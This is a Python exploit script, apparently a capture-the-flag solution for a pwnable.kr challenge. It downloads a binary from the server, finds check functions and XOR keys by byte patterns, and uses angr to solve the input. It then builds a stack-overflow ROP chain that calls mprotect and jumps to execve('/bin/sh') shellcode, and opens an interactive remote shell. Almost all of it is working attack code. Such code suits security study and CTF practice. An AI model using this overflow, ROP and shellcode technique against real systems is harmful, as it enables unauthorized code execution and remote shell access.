from pwn import *
from ctypes import c_int32
import angr
from claripy import BVS
from base64 import b64decode
from os import system
#logging.getLogger('angr.analyses').setLevel('INFO')
def find_main(exe: ELF):
    entry_code = exe.read(exe.entry, 100)
    mov_rdi_main = entry_code.index(b'\x48\xc7\xc7') # find the mov rdi, ADDR instruction and extract the instruction
    main_address = u32( entry_code[mov_rdi_main + 3 : mov_rdi_main + 7] )
    return main_address

def get_xors(exe: ELF, main_addr: int):
    """Before we get into the functions that check 
    our payload, we xor each even character location 
    with one number and each odd location with another
    this function finds them and returns them as a tuple
    in which the first element is for even locations and
     the second for odd locations"""
    main_code = exe.read(main_addr, 2000)
    xor_index = main_code.index(b'\x83\xf0') + 2
    num1 = main_code[xor_index]
    main_code = main_code[xor_index:]
    xor_index = main_code.index(b'\x83\xf0') + 2
    num2 = main_code[xor_index]
    return num1, num2

def find_first_check_func(exe: ELF, main_addr: int):
    main_code = exe.read(main_addr, 2000)
    first_check_index = main_code.index(unhex("0fb6c089ce89c7")) + 8 # find using the code for argument passing
    first_check_func_offset =  c_int32(u32(main_code[first_check_index: first_check_index+4]) + 5).value # offset from the call instruction, convert it to a c int as its negative usually
    first_check_func = main_addr + first_check_index - 1 + first_check_func_offset # include the call instruction and the offset
    call_first_check = main_addr + first_check_index - 1 - 34 # address of start of passing arguments, useful for angr
    return first_check_func,  call_first_check
  

def get_next_check_func(exe: ELF, current_func: int):
    func_code = exe.read(current_func, 500)
    next_func_offset_index = func_code.index(b'\x90\xc9\xc3') - 4
    next_func_offset = c_int32(u32(func_code[next_func_offset_index: next_func_offset_index+4]) + 5).value
    result = current_func + next_func_offset - 1 + next_func_offset_index
    return result

def get_payload_address(exe: ELF, main_addr: int):
    main_code = exe.read(main_addr, 2000)
    payload_index = main_code.index(unhex("48988890")) + 4 
    result = u32(main_code[payload_index : payload_index+4])
    return result


def get_vuln_buf_size(exe: ELF, dest_addr):
    func_code = exe.read(dest_addr, 300)
    size_index = func_code.index(unhex("4883ec")) + 3
    result = func_code[size_index]
    return result    

def get_magic_func(exe: ELF, main_addr: int):
    main_code = exe.read(main_addr, 700)
    call_index = main_code.index(b'\xba\x03\x00\x00\x00\xbe\x02\x00\x00\x00\xbf\x01\x00\x00\x00') + len(b'\xba\x03\x00\x00\x00\xbe\x02\x00\x00\x00\xbf\x01\x00\x00\x00')
    magic_func_offset = c_int32(u32(main_code[call_index + 1 : call_index + 5]) + 5).value
    result = main_addr + call_index + magic_func_offset
    return result


def generate_payload_beginning(exe: ELF, start_address, dest, payload_addr):
    flag = BVS('x', 48 * 8)
    project = angr.Project(exe.path)

    state = project.factory.blank_state(
        addr = start_address, 
        add_options = [
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,  # these two will make angr be more quiet
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
            ])
    state.regs.ebp = state.regs.esp
    state.memory.store(payload_addr, flag)

    sim_manager = project.factory.simulation_manager(state)

    sim_manager.explore(find=dest, avoid=start_address+39) # start address+39 is the puts("end of program");

    if(len(sim_manager.found) > 0):     
        return sim_manager.found[0].solver.eval(flag,cast_to=bytes)
    else: 
        error("angr failed miserably, therefore can't exploit")

def main():

    i = 15

    r = remote('pwnable.kr', 9005)

    r.recvuntil(b'wait...')
    r.recvline()
    binary = b64decode(r.recvline(keepends=False).decode())

    with open(f'bin{i}.z', 'wb') as f:
        f.write(binary)
        system(f'rm bin{i}\nuncompress bin{i}.z')



    context.binary = exe = ELF(f'./bin{i}', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    main_addr = find_main(exe)
    print(f"========== ./bin{i} ========== ")
    print(f"main in: {hex(main_addr)}")
    payload_addr = get_payload_address(exe, main_addr)
    print(f"payload: {hex(payload_addr)}")
    xors = get_xors(exe, main_addr)
    print(f"xor1: {hex(xors[0])} xor2: {hex(xors[1])}")
    first_check_func, first_check_call = find_first_check_func(exe, main_addr)
    print(f"first check function: {hex(first_check_func)}, call first check: {hex(first_check_call)}")
    

    dest_func = first_check_func
    for __ in range(16):
        dest_func = get_next_check_func(exe, dest_func)
    
    print(f"destination func: {hex(dest_func)}")

    vuln_buf_size = get_vuln_buf_size(exe, dest_func)
    print(f"{vuln_buf_size = }")

    payload  = b""
    payload += generate_payload_beginning(exe, first_check_call, dest_func, payload_addr) 

    magic_func = get_magic_func(exe, main_addr)
    print(f"magic func: {hex(magic_func)}")


    rop = ROP(exe, badchars="")
    rop.raw(b'A' * (vuln_buf_size + 8))
    rop.call(magic_func, [0, 7])
    rop.call(exe.plt.mprotect, [payload_addr & 0xfffffffffffff000, 4096]) 

    rop.call(payload_addr + 0x48 + len(rop.chain()) + 20)
    shellcode = b"\x90" * 50 +b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"        # stolen from here: https://www.exploit-db.com/exploits/47008


    payload += rop.chain() + shellcode


    xored_payload = b""

    for j, v in enumerate(payload):
        xored_payload += (v^xors[0] if j & 1 == 0 else v^xors[1]).to_bytes(1)

    encoded_paylaod = enhex(xored_payload)
    print("using payload: " + encoded_paylaod)
    r.sendline(encoded_paylaod.encode())
    r.interactive()


if __name__ == "__main__":
    main()
